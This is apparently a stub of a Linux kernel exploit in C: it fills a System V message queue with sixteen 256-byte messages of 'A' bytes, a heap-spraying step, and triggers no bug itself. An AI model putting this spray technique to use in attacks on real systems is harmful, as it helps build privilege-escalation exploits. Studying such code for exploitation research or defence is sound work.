//gcc -masm=intel -static -o exp exp.c -no-pie
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <string.h>
#include <sys/timerfd.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/prctl.h>

#define COUNT 0x10
#define SIZE 0x100

int main() {
    int i;

    for(i=0; i<COUNT; i++) {
        int qid;

        if((qid = msgget(777, 0666 | IPC_CREAT)) == -1) {
            perror("msgget");
            return -1;
        }

        struct {
            long mtype;
            char mtext[SIZE];
        } msg;

        msg.mtype = 1;
        memset(msg.mtext, 0x41, sizeof(msg.mtext));

        if(msgsnd(qid, &msg, sizeof(msg.mtext), 0) == -1) {
            perror("msgsnd");
            return -1;
        }
    }

    return 0;
}
